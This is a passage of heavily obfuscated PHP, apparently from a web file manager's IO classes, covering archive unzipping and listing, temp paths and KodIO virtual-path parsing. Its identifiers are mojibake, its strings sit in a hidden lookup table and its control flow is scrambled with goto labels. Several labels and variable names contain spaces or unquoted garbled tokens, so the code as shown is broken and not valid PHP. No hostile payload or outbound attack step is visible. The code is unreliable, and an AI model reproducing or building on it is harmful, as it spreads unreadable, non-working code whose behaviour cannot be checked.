$b‹’ñ§‘íˆ) { if ($b‹’ñ§‘íˆ == $aÏ„áÍËÒ‡) { continue; } del_file($b‹’ñ§‘íˆ); } } return $d… å‘øáë; } $B§°‡»‡Çã = self::pathFather($Dê“µ°­öê[$Fà•õ»é…[75]]); $a•”È¬Úã = self::move($d… å‘øáë, $B§°‡»‡Çã, $c»Ş©ïÁÈó); goto aèÅèÅ­; B¾…øÂá‚é: $Fà•õ»é… =& $_SERVER[”Ì÷ñ­î¸]; $Fñ¸àÇ…åÛ = self::init($e©Û›…ÕÊ÷[0][$Fà•õ»é…[75]]); $Dê“µ°­öê = self::info($e©Û›…ÕÊ÷[0][$Fà•õ»é…[75]]); goto c¼áè¾ª›ë; dÙà¡¾ˆÈÈ: if (count($dâÉ¾İÍ¯ô) > 1) { $bÔÇª‚Ã‚ò = IO::info(IO::pathFather($Dê“µ°­öê[$Fà•õ»é…[75]])); $A’“ è„ƒá = $bÔÇª‚Ã‚ò[$Fà•õ»é…[28]]; } $dÀ«ÈÚ³³Ï = $D±¤Âƒ®³˜; if (!$dÀ«ÈÚ³³Ï) { $dÀ«ÈÚ³³Ï = get_path_father($Dê“µ°­öê[$Fà•õ»é…[75]]); $F÷Ôß¶¬œ… = IO::info($dÀ«ÈÚ³³Ï); if (!$F÷Ôß¶¬œ…[$Fà•õ»é…[189]]) { show_json(LNG($Fà•õ»é…[1026]), !1); } } goto fÖ¤Óáá²£; eö¨í¬‰×: } public static function unzip($d£Ñç¥¢ó±, $B×›ŠÂŒ¤• = "\x72\x65\160\154\141\143\x65") { goto f¥àÈ®˜Ï´; aÀàßĞ„: Hook::trigger($eÇ‚İš½ó›[1035], $fÇÆ¦æİ§¦); recursion_dir($fÇÆ¦æİ§¦, $bŒ×¡Å™¡˜, $b¿Ş¥ğÎìÍ, 0); $C”ßªÛÛóŠ = array_merge($bŒ×¡Å™¡˜, $b¿Ş¥ğÎìÍ); goto EÏĞï¤­å; A˜½æ“Œâ’: $d–·¦Å = KodArchive::extract($aÉ¥¬È™õ“, $fÇÆ¦æİ§¦ . $eÇ‚İš½ó›[8], $dä™İºé); self::archiveExt(); if (!$d–·¦Å[$eÇ‚İš½ó›[1032]]) { show_json($eÇ‚İš½ó›[1033] . $d–·¦Å[$eÇ‚İš½ó›[1034]], !1); } goto aÀàßĞ„; f¥àÈ®˜Ï´: $eÇ‚İš½ó› =& $_SERVER[”Ì÷ñ­î¸]; $b”ñ‡Ô¥Ÿ = $d£Ñç¥¢ó±[$eÇ‚İš½ó›[75]]; $f‰Œ³ºÕÓ = $d£Ñç¥¢ó±[$eÇ‚İš½ó›[1028]]; goto dªöÄÑºÙ«; aÒ—Ã§èö×: $E¾óƒŠè‘¡ = self::tmpFileName($CÔ¤¶ß©¹À); $fÇÆ¦æİ§¦ = TEMP_FILES . $E¾óƒŠè‘¡; del_dir($fÇÆ¦æİ§¦); goto eÃÇ½¤ÜÛ; dªöÄÑºÙ«: if (!($CÔ¤¶ß©¹À = parent::info($b”ñ‡Ô¥Ÿ))) { show_json(LNG($eÇ‚İš½ó›[1029]), !1); } if (!($C¢âÌÒ³È• = parent::infoFull($f‰Œ³ºÕÓ))) { $f‰Œ³ºÕÓ = parent::mkdir($f‰Œ³ºÕÓ); $C¢âÌÒ³È• = array($eÇ‚İš½ó›[75] => $f‰Œ³ºÕÓ); } else { if (isset($C¢âÌÒ³È•[$eÇ‚İš½ó›[369]]) && trim($C¢âÌÒ³È•[$eÇ‚İš½ó›[75]], $eÇ‚İš½ó›[8]) != trim($f‰Œ³ºÕÓ, $eÇ‚İš½ó›[8])) { $fÏ¢‡± = KodIO::make($C¢âÌÒ³È•[$eÇ‚İš½ó›[461]]); $bãŠ¯Â†ç = parent::fileNameAuto($fÏ¢‡±, $C¢âÌÒ³È•[$eÇ‚İš½ó›[28]], REPEAT_RENAME_FOLDER, !0); $f‰Œ³ºÕÓ = parent::mkdir($fÏ¢‡± . $bãŠ¯Â†ç); $C¢âÌÒ³È• = array($eÇ‚İš½ó›[75] => $f‰Œ³ºÕÓ); } } $f‰Œ³ºÕÓ = $C¢âÌÒ³È•[$eÇ‚İš½ó›[75]]; goto aÒ—Ã§èö×; E ©íêÏÓñ: return !0; goto AÅ‰Î¦Ú–ñ; EÏĞï¤­å: foreach ($C”ßªÛÛóŠ as $fš™•Â½œ­) { $fš™•Â½œ­ = self::iconvApp($fš™•Â½œ­); self::move($fš™•Â½œ­, $f‰Œ³ºÕÓ, $B×›ŠÂŒ¤•); } del_dir($fÇÆ¦æİ§¦); if (!$D·…ÕŒÖ­ù) { del_file($aÉ¥¬È™õ“); } goto E ©íêÏÓñ; CğºêÈ«: if (!@file_exists(self::iconvSystem($aÉ¥¬È™õ“))) { $D·…ÕŒÖ­ù = self::localFilePath($b”ñ‡Ô¥Ÿ, $cÀÚ‹é§•); $aÉ¥¬È™õ“ = $D·…ÕŒÖ­ù ? $D·…ÕŒÖ­ù : parent::download($b”ñ‡Ô¥Ÿ, $aÉ¥¬È™õ“); } $aÉ¥¬È™õ“ = self::iconvSystem($aÉ¥¬È™õ“); $dä™İºé = isset($d£Ñç¥¢ó±[$eÇ‚İš½ó›[1030]]) ? $d£Ñç¥¢ó±[$eÇ‚İš½ó›[1030]] : $eÇ‚İš½ó›[1031]; goto A˜½æ“Œâ’; eÃÇ½¤ÜÛ: mk_dir($fÇÆ¦æİ§¦); $cÀÚ‹é§• = self::fileExt($CÔ¤¶ß©¹À); $aÉ¥¬È™õ“ = $fÇÆ¦æİ§¦ . $eÇ‚İš½ó›[91] . $cÀÚ‹é§•; goto CğºêÈ«; AÅ‰Î¦Ú–ñ: } public static function unzipList($DÛ„Æœ•„) { goto bØéƒÒ¤´‚; BŠ½“Ú¹ç¿: $e´îäÛœµ– = self::info($CÔ”äö×º­); $F´ÈÍø‰¸ = self::fileExt($e´îäÛœµ–); $Cì•‰‘Ğ†Ë = self::tmpFileName($e´îäÛœµ–); goto B¦Ëø‡¹Ìˆ; Eæì±ƒºã: $c³—ßÜÖ°¼ = 50000; if (request_url_safe($d°É°æŒº«)) { $e‚×ğ‡šôù = parse_url_query($d°É°æŒº«); if (!isset($e‚×ğ‡šôù[$cäÉÌ¸ÎÑÄ[75]])) { show_json($cäÉÌ¸ÎÑÄ[1037], !1); } } $CÔ”äö×º­ = isset($e‚×ğ‡šôù) ? $e‚×ğ‡šôù[$cäÉÌ¸ÎÑÄ[75]] : $d°É°æŒº«; goto BŠ½“Ú¹ç¿; B¦Ëø‡¹Ìˆ: if (isset($e‚×ğ‡šôù)) { $dÕ›áó†¼¼ = array($e‚×ğ‡šôù[$cäÉÌ¸ÎÑÄ[75]], $e‚×ğ‡šôù[$cäÉÌ¸ÎÑÄ[1036]], $e‚×ğ‡šôù[$cäÉÌ¸ÎÑÄ[28]]); $c½ùãÒÉì° = md5(implode($cäÉÌ¸ÎÑÄ[70], $dÕ›áó†¼¼)) . $cäÉÌ¸ÎÑÄ[91] . get_path_ext($e‚×ğ‡šôù[$cäÉÌ¸ÎÑÄ[28]]); } else { $dÕ›áó†¼¼ = array($e´îäÛœµ–[$cäÉÌ¸ÎÑÄ[28]], $e´îäÛœµ–[$cäÉÌ¸ÎÑÄ[75]], $e´îäÛœµ–[$cäÉÌ¸ÎÑÄ[77]]); $c½ùãÒÉì° = md5(implode($cäÉÌ¸ÎÑÄ[70], $dÕ›áó†¼¼)) . $cäÉÌ¸ÎÑÄ[91] . $F´ÈÍø‰¸; } if ($d‡éŸ‡î§ == -1) { $ağÉ¡“ŠÁÃ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\x69\x65\167\57{$Cì•‰‘Ğ†Ë}\57{$c½ùãÒÉì°}\56\x6c\x6f\147"; $E¦§õáŒ‰ = self::infoFull($ağÉ¡“ŠÁÃ); if ($E¦§õáŒ‰) { $ağÉ¡“ŠÁÃ = $E¦§õáŒ‰[$cäÉÌ¸ÎÑÄ[75]]; $dËÄ«ó„§‘ = self::getContent($ağÉ¡“ŠÁÃ); if ($dËÄ«ó„§‘) { $dã˜¹òáŠÌ = json_decode($dËÄ«ó„§‘, !0); if (count($dã˜¹òáŠÌ) >= $c³—ßÜÖ°¼) { show_json(sprintf(LNG($cäÉÌ¸ÎÑÄ[1038]), count($dã˜¹òáŠÌ)), !1); } return $dã˜¹òáŠÌ; } } else { $ağÉ¡“ŠÁÃ = self::mkfile($ağÉ¡“ŠÁÃ); } } $dÃÖ”¥„¬ = TEMP_FILES . $Cì•‰‘Ğ†Ë; goto bÂ†‰ïò•®; bÅİó¥¬ÏÇ: self::archiveExt(); del_dir($dÃÖ”¥„¬); if (!$bÍÑĞ‘˜ƒ…[$cäÉÌ¸ÎÑÄ[1032]]) { show_json($bÍÑĞ‘˜ƒ…[$cäÉÌ¸ÎÑÄ[1034]], !1); } goto a“ÚÛ›òÓ˜; bØéƒÒ¤´‚: $cäÉÌ¸ÎÑÄ =& $_SERVER[”Ì÷ñ­î¸]; $d°É°æŒº« = $DÛ„Æœ•„[$cäÉÌ¸ÎÑÄ[75]]; $d‡éŸ‡î§ = isset($DÛ„Æœ•„[$cäÉÌ¸ÎÑÄ[1036]]) ? $DÛ„Æœ•„[$cäÉÌ¸ÎÑÄ[1036]] : -1; goto Eæì±ƒºã; D ¯ï†Š´‘: $EË¡Ä¡Ô»  = self::iconvSystem($EË¡Ä¡Ô» ); if ($d‡éŸ‡î§ >= 0) { $CÎ«èí–¬ = isset($DÛ„Æœ•„[$cäÉÌ¸ÎÑÄ[1040]]) ? $DÛ„Æœ•„[$cäÉÌ¸ÎÑÄ[1040]] : !1; $cÚºªæç = isset($DÛ„Æœ•„[$cäÉÌ¸ÎÑÄ[28]]) ? $DÛ„Æœ•„[$cäÉÌ¸ÎÑÄ[28]] : $cäÉÌ¸ÎÑÄ[33]; KodArchive::filePreview($EË¡Ä¡Ô» , $d‡éŸ‡î§, $CÎ«èí–¬, $cÚºªæç); self::archiveExt(); die; } $bÍÑĞ‘˜ƒ… = KodArchive::listContent($EË¡Ä¡Ô» ); goto bÅİó¥¬ÏÇ; a“ÚÛ›òÓ˜: $dã˜¹òáŠÌ = json_encode($bÍÑĞ‘˜ƒ…[$cäÉÌ¸ÎÑÄ[1034]]); self::setContent($ağÉ¡“ŠÁÃ, $dã˜¹òáŠÌ); if (count($bÍÑĞ‘˜ƒ…[$cäÉÌ¸ÎÑÄ[1034]]) >= $c³—ßÜÖ°¼) { show_json(sprintf(LNG($cäÉÌ¸ÎÑÄ[1038]), count($bÍÑĞ‘˜ƒ…[$cäÉÌ¸ÎÑÄ[1034]])), !1); } goto cĞåÈ—íÙ”; bÂ†‰ïò•®: if (!is_dir($dÃÖ”¥„¬)) { mk_dir($dÃÖ”¥„¬); } $EË¡Ä¡Ô»  = $dÃÖ”¥„¬ . $cäÉÌ¸ÎÑÄ[8] . $c½ùãÒÉì°; if (!@file_exists(self::iconvSystem($EË¡Ä¡Ô» ))) { if (isset($e‚×ğ‡šôù)) { url_request($d°É°æŒº«, $cäÉÌ¸ÎÑÄ[1039], $EË¡Ä¡Ô» ); } else { $FÂùĞ“Â¦‡ = self::localFilePath($d°É°æŒº«, $F´ÈÍø‰¸); $EË¡Ä¡Ô»  = $FÂùĞ“Â¦‡ ? $FÂùĞ“Â¦‡ : self::download($d°É°æŒº«, $EË¡Ä¡Ô» ); } } goto D ¯ï†Š´‘; cĞåÈ—íÙ”: return $bÍÑĞ‘˜ƒ…[$cäÉÌ¸ÎÑÄ[1034]]; goto cÜÏ¥¢‡âÒ; cÜÏ¥¢‡âÒ: } private static function fileExt($côï’ÆÄğ‚) { $eØÂ¸‡¸’¦ =& $_SERVER[”Ì÷ñ­î¸]; $c®†Ÿ¶¡©÷ = $côï’ÆÄğ‚[$eØÂ¸‡¸’¦[160]]; if ($c®†Ÿ¶¡©÷ == $eØÂ¸‡¸’¦[1041]) { $FÖŒƒ¼§¢Ù = $eØÂ¸‡¸’¦[1042]; if (substr($côï’ÆÄğ‚[$eØÂ¸‡¸’¦[28]], -strlen($FÖŒƒ¼§¢Ù)) == $FÖŒƒ¼§¢Ù) { $c®†Ÿ¶¡©÷ = $eØÂ¸‡¸’¦[1043]; } } self::archiveExt($c®†Ÿ¶¡©÷); return $c®†Ÿ¶¡©÷; } private static function zipFileList($A©êò¼ˆ¡, $AáŸ›‘š­ = false) { $FšîŞ¡í× =& $_SERVER[”Ì÷ñ­î¸]; $Cõ¸øìè­ = array(); foreach ($A©êò¼ˆ¡ as $Dê×ò‡µŞƒ) { $a–©¥ÔÖ©† = $Dê×ò‡µŞƒ[$FšîŞ¡í×[75]]; if ($AáŸ›‘š­) { $a–©¥ÔÖ©† = self::copy($Dê×ò‡µŞƒ[$FšîŞ¡í×[75]], $AáŸ›‘š­, $FšîŞ¡í×[746]); } if ($a–©¥ÔÖ©† && self::local()->exist($a–©¥ÔÖ©†)) { $Cõ¸øìè­[$Dê×ò‡µŞƒ[$FšîŞ¡í×[75]]] = $a–©¥ÔÖ©†; } } if (!empty($Cõ¸øìè­)) { return array_values($Cõ¸øìè­); } show_json(LNG($FšîŞ¡í×[1044]), !1); } public static function tmpFileName($F°ğçÔïÜù) { $D¸áŠ¼Œ =& $_SERVER[”Ì÷ñ­î¸]; $e¼£òùÏ©Â = array($F°ğçÔïÜù[$D¸áŠ¼Œ[28]], $F°ğçÔïÜù[$D¸áŠ¼Œ[75]], $F°ğçÔïÜù[$D¸áŠ¼Œ[77]], $F°ğçÔïÜù[$D¸áŠ¼Œ[459]]); return md5(implode($D¸áŠ¼Œ[70], $e¼£òùÏ©Â)); } private static function localFilePath($bèöÄí†ë‹, $eõóİì£†) { goto EÀª—¼Ê§ì; bÓ–‚ŠùÆä: if ($A¿œÈ…¿ù == $eˆ‚˜ÌÅ†¬[102] || $A¿œÈ…¿ù == $eˆ‚˜ÌÅ†¬[1048]) { if (!$aâÕš—³”‹->exist($aâÕš—³”‹->path)) { show_json(LNG($eˆ‚˜ÌÅ†¬[101]), !1); } return $aâÕš—³”‹->path; } return !1; goto föì¸ÕÍÂ©; EÀª—¼Ê§ì: $eˆ‚˜ÌÅ†¬ =& $_SERVER[”Ì÷ñ­î¸]; if ($eõóİì£† == $eˆ‚˜ÌÅ†¬[1045] && strtoupper(substr(PHP_OS, 0, 3)) == $eˆ‚˜ÌÅ†¬[1046]) { return !1; } $Añä®°Ù¡³ = KodIO::parse($bèöÄí†ë‹); goto A××™ÓÕØ; A××™ÓÕØ: if ($Añä®°Ù¡³[$eˆ‚˜ÌÅ†¬[29]] == KodIO::KOD_SOURCE) { $dğ‚ã›æÖ = Model($eˆ‚˜ÌÅ†¬[754])->fileInfoGet(KodIO::sourceID($bèöÄí†ë‹)); if (!$dğ‚ã›æÖ[$eˆ‚˜ÌÅ†¬[75]]) { show_json($eˆ‚˜ÌÅ†¬[1047], !1); } $bèöÄí†ë‹ = $dğ‚ã›æÖ[$eˆ‚˜ÌÅ†¬[75]]; } $aâÕš—³”‹ = self::init($bèöÄí†ë‹); $A¿œÈ…¿ù = $aâÕš—³”‹->getType(); goto bÓ–‚ŠùÆä; föì¸ÕÍÂ©: } private static function archiveExt($DÒÎ³ÈĞ×Õ = '') { $GLOBALS[$_SERVER[”Ì÷ñ­î¸][1049]] = $DÒÎ³ÈĞ×Õ; } } class KodIO { const KOD_SOURCE = "\173\163\157\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\x75\163\x65\x72\122\145\143\171\143\x6c\x65\175"; const KOD_USER_FAV = "\x7b\x75\x73\145\x72\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\165\x73\145\x72\106\151\154\145\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\145\x72\106\x69\154\x65\x54\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\x75\160\x52\157\157\x74\x53\145\154\x66\175"; const KOD_USER_SHARE = "\x7b\165\x73\x65\x72\x53\150\141\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\162\123\x68\x61\x72\x65\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\x72\145\x54\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\x61\x72\x65\111\164\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\162\x65\x49\x74\145\155\114\x69\156\153\x7d"; const KOD_SEARCH = "\x7b\163\x65\141\x72\143\x68\x7d"; const KOD_BLOCK = "\173\142\154\x6f\143\153\x7d"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\165\163\x65\162\x52\145\x6e\143\145\156\164\x7d"; const KOD_USER_DRIVER = "\173\144\162\x69\166\x65\162\x7d"; public static function typeList() { $aÓ¾„ƒÂ =& $_SERVER[”Ì÷ñ­î¸]; return array($aÓ¾„ƒÂ[1050] => self::KOD_SOURCE, $aÓ¾„ƒÂ[1051] => self::KOD_USER_RECYCLE, $aÓ¾„ƒÂ[1052] => self::KOD_USER_FAV, $aÓ¾„ƒÂ[1053] => self::KOD_USER_FILE_TAG, $aÓ¾„ƒÂ[1054] => self::KOD_USER_FILE_TYPE, $aÓ¾„ƒÂ[1055] => self::KOD_GROUP_ROOT_SELF, $aÓ¾„ƒÂ[1056] => self::KOD_USER_SHARE, $aÓ¾„ƒÂ[1057] => self::KOD_USER_SHARE_LINK, $aÓ¾„ƒÂ[1058] => self::KOD_USER_SHARE_TO_ME, $aÓ¾„ƒÂ[1059] => self::KOD_SHARE_ITEM, $aÓ¾„ƒÂ[1060] => self::KOD_SHARE_LINK, $aÓ¾„ƒÂ[1061] => self::KOD_SEARCH, $aÓ¾„ƒÂ[1062] => self::KOD_BLOCK, $aÓ¾„ƒÂ[1063] => self::KOD_IO, $aÓ¾„ƒÂ[1064] => self::KOD_USER_RECENT, $aÓ¾„ƒÂ[1065] => self::KOD_USER_DRIVER); } public static function parse($aµğ¿ÒŞ¯) { goto EÃÒ°‹Ñ¹; c·–á‡…: $föĞ±À”ø = array($eºàáä£[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $B‡“„ˆÀÛ[$eºàáä£[1070]] = in_array($B‡“„ˆÀÛ[$eºàáä£[29]], $föĞ±À”ø); return $B‡“„ˆÀÛ; goto F‡£Êµ‰‰ƒ; FìÆ¯¯ĞÒ—: preg_match($eºàáä£[1066], $aµğ¿ÒŞ¯, $cÔ´±Õä²—); $B‡“„ˆÀÛ = array($eºàáä£[388] => !1, $eºàáä£[1067] => !1, $eºàáä£[385] => !1, $eºàáä£[75] => $aµğ¿ÒŞ¯, $eºàáä£[1012] => !1, $eºàáä£[1011] => $eºàáä£[33]); if (is_array($cÔ´±Õä²—) && count($cÔ´±Õä²—) == 5) { $d’ñîŞ²ğƒ = $eºàáä£[1068] . $cÔ´±Õä²—[2] . $eºàáä£[315]; if (in_array($d’ñîŞ²ğƒ, $D²¦‡£ÑÊ)) { $B‡“„ˆÀÛ[$eºàáä£[1012]] = $cÔ´±Õä²—[1]; $B‡“„ˆÀÛ[$eºàáä£[29]] = $d’ñîŞ²ğƒ; $B‡“„ˆÀÛ[$eºàáä£[1069]] = substr($d’ñîŞ²ğƒ, 1, -1); $B‡“„ˆÀÛ[$eºàáä£[367]] = $cÔ´±Õä²—[3]; } $B‡“„ˆÀÛ[$eºàáä£[1011]] = $cÔ´±Õä²—[4]; } goto c·–á‡…; EÃÒ°‹Ñ¹: $eºàáä£ =& $_SERVER[”Ì÷ñ­î¸]; $aµğ¿ÒŞ¯ = self::clear($aµğ¿ÒŞ¯); $D²¦‡£ÑÊ = array_values(self::typeList()); goto FìÆ¯¯ĞÒ—; F‡£Êµ‰‰ƒ: } public static function clear($fÚŠÄìÎËŸ) { goto b¬Ã·Ôì×É; a§­‹Îƒ¦É: $fÚŠÄìÎËŸ = preg_replace($CÉ“îà¯Ú½[1073], $CÉ“îà¯Ú½[8], $fÚŠÄìÎËŸ); if ($fÚŠÄìÎËŸ == $CÉ“îà¯Ú½[8]) { return $CÉ“îà¯Ú½[8]; } $fÚŠÄìÎËŸ = rtrim($fÚŠÄìÎËŸ, $CÉ“îà¯Ú½[8]); goto c‘ÁÈç«øÍ; b¬Ã·Ôì×É: $CÉ“îà¯Ú½ =& $_SERVER[”Ì÷ñ­î¸]; $fÚŠÄìÎËŸ = str_replace(array($CÉ“îà¯Ú½[992], $CÉ“îà¯Ú½[217]), $CÉ“îà¯Ú½[50], $fÚŠÄìÎËŸ); $fÚŠÄìÎËŸ = str_replace($CÉ“îà¯Ú½[93], $CÉ“îà¯Ú½[8], $fÚŠÄìÎËŸ); goto dæÆ‚µŒ®¯; c‘ÁÈç«øÍ: return $fÚŠÄìÎËŸ; goto eÂÁğÔç; dæÆ‚µŒ®¯: $AÅñùà›Ñä = $CÉ“îà¯Ú½[1071]; if (substr($fÚŠÄìÎËŸ, 0, 3) == $CÉ“îà¯Ú½[1072]) { $fÚŠÄìÎËŸ = substr($fÚŠÄìÎËŸ, 3); } while (strstr($fÚŠÄìÎËŸ, $AÅñùà›Ñä)) { $fÚŠÄìÎËŸ = str_replace($AÅñùà›Ñä, $CÉ“îà¯Ú½[8], $fÚŠÄìÎËŸ); } goto a§­‹Îƒ¦É; eÂÁğÔç: } public static function sourceID($f©‘‘®²ò) { $B–÷µ«Ñ¹À =& $_SERVER[”Ì÷ñ­î¸]; $c¹ï‡Ş’‡ = self::parse($f©‘‘®²ò); if ($c¹ï‡Ş’‡[$B–÷µ«Ñ¹À[29]] !== self::KOD_SOURCE) { show_json(LNG($B–÷µ«Ñ¹À[1074]), !1); } return $c¹ï‡Ş’‡[$B–÷µ«Ñ¹À[367]]; } public static function make($e§¶¯Òæß) { if (!$e§¶¯Òæß) { return !1; } return self::makePath(self::KOD_SOURCE, intval($e§¶¯Òæß)); } public static function makeShare($Eìæ”Öæ¥‹, $cÇŒ•ÉË÷É) { return self::makePath(self::KOD_SHARE_ITEM, $Eìæ”Öæ¥‹, $cÇŒ•ÉË÷É); } public static function makeFileTypePath($aœ‹§§È‘à) { return self::makePath(self::KOD_USER_FILE_TYPE, $aœ‹§§È‘à); } public static function makeFileTagPath($f…¸Âë¿£) { return self::makePath(self::KOD_USER_FILE_TAG, $f…¸Âë¿£); } public static function makePath($C´ÈŒŸ±ˆ‰, $Fµ©ÒÒ˜º = '', $c—ƒª•†‹ˆ = '') { $F®œ‡ËÒµ =& $_SERVER[”Ì÷ñ­î¸]; $bìôÜ—ˆãô = substr($C´ÈŒŸ±ˆ‰, 1, -1); $e…×Îëçõ“ = $F®œ‡ËÒµ[1075] . $bìôÜ—ˆãô . $F®œ‡ËÒµ[1076] . $Fµ©ÒÒ˜º . $F®œ‡ËÒµ[1077]; $e…×Îëçõ“ = $c—ƒª•†‹ˆ ? $e…×Îëçõ“ . $c—ƒª•†‹ˆ . $F®œ‡ËÒµ[8] : $e…×Îëçõ“; return $e…×Îëçõ“; } public static function hashPath($C•šø¹„Æº) { $f™½› ¡Â¿ =& $_SERVER[”Ì÷ñ­î¸]; $d¶äö„–Ö = is_array($C•šø¹„Æº) ? $C•šø¹„Æº : IO::info($C•šø¹„Æº); $aÙÅ¾ç‘… = _get($d¶äö„–Ö, $f™½› ¡Â¿[1078], $f™½› ¡Â¿[33]); if (!$aÙÅ¾ç‘…) { $E‚Ïóƒ„ˆ = KodIO::parse($d¶äö„–Ö[$f™½› ¡Â¿[75]]); if (!$E‚Ïóƒ„ˆ[$f™½› ¡Â¿[29]]) { $aÙÅ¾ç‘… = IO::hashSimple($d¶äö„–Ö[$f™½› ¡Â¿[75]]); } } if (!$aÙÅ¾ç‘…) { $aÙÅ¾ç‘… = md5($d¶äö„–Ö[$f™½› ¡Â¿[75]] . $d¶äö„–Ö[$f™½› ¡Â¿[77]] . $d¶äö„–Ö[$f™½› ¡Â¿[107]]); } return $aÙÅ¾ç‘…; } public static function initSystemPath() { $fÑã¼ùÙŒ =& $_SERVER[”Ì÷ñ­î¸]; if (defined($fÑã¼ùÙŒ[1079])) { return; } define($fÑã¼ùÙŒ[1079], self::systemPath($fÑã¼ùÙŒ[1080])); define($fÑã¼ùÙŒ[1081], self::systemPath($fÑã¼ùÙŒ[1082])); define($fÑã¼ùÙŒ[1083], self::systemPath($fÑã¼ùÙŒ[1084])); define($fÑã¼ùÙŒ[1085], self::systemPath($fÑã¼ùÙŒ[1086])); } private static function systemPath($F˜¨°Ÿ»©) { goto b¯ŒØ¾·¨; b¯ŒØ¾·¨: $A‘ñ˜Ÿò© =& $_SERVER[”Ì÷ñ­î¸]; $Eñõšİ‡”¡ = $A‘ñ˜Ÿò©[1087] . ucfirst($F˜¨°Ÿ»©); $EŒØàÆé›Œ = Model($A‘ñ˜Ÿò©[1088])->get($Eñõšİ‡”¡); goto a¶Á‰œÂÙÍ; f›«áê‹ïğ: return $EŒØàÆé›Œ; goto b¥ÉÎ°Î–©; a¶Á‰œÂÙÍ: if ($EŒØàÆé›Œ) { return $EŒØàÆé›Œ; } if ($F˜¨°Ÿ»© == $A‘ñ˜Ÿò©[1080]) { $EŒØàÆé›Œ = self::make(Model($A‘ñ˜Ÿò©[754])->systemRootPathAdd($A‘ñ˜Ÿò©[1089])); } else { $EŒØàÆé›Œ = self::systemPath($A‘ñ˜Ÿò©[1080]); $bõÅÖ„¯Óˆ = self::sourceID($EŒØàÆé›Œ); $EŒØàÆé›Œ = self::make(Model($A‘ñ˜Ÿò©[754])->mkdir($bõÅÖ„¯Óˆ, $F˜¨°Ÿ»©)); } Model($A‘ñ˜Ÿò©[1088])->set($Eñõšİ‡”¡, $EŒØàÆé›Œ); goto f›«áê‹ïğ; b¥ÉÎ°Î–©: } public static function systemFolder($bª„Í¸š†Ô) { $f¯‰é–áì = IO_PATH_SYSTEM_SOURCE . $bª„Í¸š†Ô; $dŠ¼¸êäŞˆ = Cache::get($f¯‰é–áì); if (!$dŠ¼¸êäŞˆ) { $cÔÆ–ÕŠ´ = IO::infoFull($f¯‰é–áì); if (!$cÔÆ–ÕŠ´) { $dŠ¼¸êäŞˆ = IO::mkdir($f¯‰é–áì, REPEAT_SKIP); } else { $dŠ¼¸êäŞˆ = $cÔÆ–ÕŠ´[$_SERVER[”Ì÷ñ­î¸][75]]; } Cache::set($f¯‰é–áì, $dŠ¼¸êäŞˆ, 3600 * 10); } return $dŠ¼¸êäŞˆ; } public static function defaultDriver() { return Model($_SERVER[”Ì÷ñ­î¸][705])->defaultDriver(); } public static function defaultIO() { $F‹“³ÚÄˆÄ =& $_SERVER[”Ì÷ñ­î¸]; $f…Õæ†¨¶À = self::defaultDriver(); return $F‹“³ÚÄˆÄ[1090] . $f…Õæ†¨¶À[$F‹“³ÚÄˆÄ[367]] . $F‹“³ÚÄˆÄ[1077]; } public static function defaultDriverInit() { static $dºÓˆù›³Å = false; if ($dºÓˆù›³Å) { return $dºÓˆù›³Å; } $dºÓˆù›³Å = IO::init(self::defaultIO()); return $dºÓˆù›³Å; } public static function fileTypeList() { $C±àŒ«ëËê =& $_SERVER[”Ì÷ñ­î¸]; $aãëº¨™îº = $GLOBALS[$C±àŒ«ëËê[6]][$C±àŒ«ëËê[1091]]; foreach ($aãëº¨™îº as $aŸè²†‘Š => $AåãùäêƒŸ) { $FŠŸŒ‰ÄË» = $C±àŒ«ëËê[1092] . $aŸè²†‘Š; $EœØÎñïô¬ = LNG($FŠŸŒ‰ÄË»); if ($FŠŸŒ‰ÄË» != $EœØÎñïô¬) { $aãëº¨™îº[$aŸè²†‘Š][$C±àŒ«ëËê[28]] = $EœØÎñïô¬; } } return $aãëº¨™îº; } public static function transferType($CÕÅğ®Ô“…, $eƒÒà‡¾ÉÒ) { goto cæ·ïõ¢ß‡; BÉÔ±Êí„ë: if ($dóŸĞ­µÅí[$FÙæ”ğ¶[29]] == $Aƒ“Ï½£Äô[$FÙæ”ğ¶[29]] && $dóŸĞ­µÅí[$FÙæ”ğ¶[1093]] == $Aƒ“Ï½£Äô[$FÙæ”ğ¶[1093]]) { return $FÙæ”ğ¶[1094]; } if ($dóŸĞ­µÅí[$FÙæ”ğ¶[29]] == $FÙæ”ğ¶[780] && $Aƒ“Ï½£Äô[$FÙæ”ğ¶[29]] == $FÙæ”ğ¶[102]) { return $FÙæ”ğ¶[1040]; } if ($dóŸĞ­µÅí[$FÙæ”ğ¶[29]] == $FÙæ”ğ¶[102] && $Aƒ“Ï½£Äô[$FÙæ”ğ¶[29]] == $FÙæ”ğ¶[780]) { return $FÙæ”ğ¶[103]; } goto CÀ‰‹î‰; cæ·ïõ¢ß‡: $FÙæ”ğ¶ =& $_SERVER[”Ì÷ñ­î¸]; $dóŸĞ­µÅí = self::driverType($CÕÅğ®Ô“…); $Aƒ“Ï½£Äô = self::driverType($eƒÒà‡¾ÉÒ); goto BÉÔ±Êí„ë; CÀ‰‹î‰: return $FÙæ”ğ¶[1095]; goto eñ÷³ØÜ•Ö; eñ÷³ØÜ•Ö: } public static function driverType($B± Ş”Ä§˜) { goto DÅ¶•Š¹ºª; DÅ¶•Š¹ºª: $DÜˆÜèÁõ =& $_SERVER[”Ì÷ñ­î¸]; $c‡å“¼ š¼ = $B± Ş”Ä§˜->path; $Dƒ…Ñ¿¤šø = str_replace($DÜˆÜèÁõ[1096], $DÜˆÜèÁõ[33], strtolower($B± Ş”Ä§˜->getType())); goto C½…Ö¿ó½ñ; C½…Ö¿ó½ñ: if ($Dƒ…Ñ¿¤šø == $DÜˆÜèÁõ[695] || $Dƒ…Ñ¿¤šø == $DÜˆÜèÁõ[1097] || $Dƒ…Ñ¿¤šø == 